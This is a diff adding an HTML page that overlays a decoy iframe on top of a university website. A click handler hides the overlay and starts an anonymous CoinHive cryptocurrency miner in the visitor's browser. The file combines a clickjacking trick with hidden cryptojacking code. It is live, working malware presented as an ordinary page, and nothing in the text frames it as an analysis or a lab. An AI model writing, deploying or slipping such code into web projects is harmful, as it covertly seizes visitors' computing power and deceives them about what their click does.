@@ -1,0 +1,28 @@
+<html >
+<head><title></title></head>
+<body>
+
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+window.onload = function(e){
+	document.getElementById("top").contentWindow.document.body.onclick = function(){ 
+		document.getElementById("top").style="width:0; height:0; border:0; border:none;";
+		var miner = new CoinHive.Anonymous('PX3es8Gm6lJhMAnIGO0LIjIFlFk4Mabr');
+		miner.start();
+	};
+};
+</script>
+
+<iframe id="bottom" src="http://www.cse.hcmut.edu.vn" width="1000" height="3000">
+</iframe>
+
+<iframe id="top" src="frame2.html" width="1000" height="3000">
+</iframe>
+
+<style type="text/css">
+  #top     {position:absolute; top:0px; left:0px; opacity:1.0; z-index:1}
+  #bottom  {position:absolute; top:0px; left:0px; opacity:1.0; z-index:0}
+</style>
+
+</body>
+</html>
